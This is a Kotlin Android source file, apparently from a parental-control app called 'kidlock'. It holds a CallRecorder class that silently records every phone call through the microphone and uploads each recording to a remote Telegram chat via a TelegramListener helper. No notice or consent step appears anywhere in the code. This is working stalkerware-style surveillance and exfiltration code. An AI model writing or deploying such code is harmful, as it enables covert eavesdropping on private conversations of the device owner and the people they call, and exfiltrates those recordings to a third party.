package com.kidlock

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaRecorder
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecorder(private val context: Context) {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            when (state) {
                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                    startRecording()
                }
                TelephonyManager.EXTRA_STATE_IDLE -> {
                    if (isRecording) stopAndSend()
                }
            }
        }
    }

    fun start() {
        val filter = IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)
        context.registerReceiver(receiver, filter)
    }

    private fun startRecording() {
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            outputFile = File(context.cacheDir, "call_$timestamp.mp3")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(outputFile?.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            Log.d("CallRecorder", "Recording started: ${outputFile?.name}")
        } catch (e: Exception) {
            Log.e("CallRecorder", "startRecording error: ${e.message}")
        }
    }

    private fun stopAndSend() {
        try {
            recorder?.apply {
                stop()
                release()
            }
            recorder = null
            isRecording = false

            outputFile?.let { file ->
                if (file.exists() && file.length() > 1024) {
                    Log.d("CallRecorder", "Sending recording: ${file.name}")
                    TelegramListener.instance.sendAudio(
                        file.absolutePath,
                        "📞 Call recording — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e("CallRecorder", "stopAndSend error: ${e.message}")
        }
    }

    fun stop() {
        try { context.unregisterReceiver(receiver) } catch (e: Exception) {}
        if (isRecording) stopAndSend()
    }
}
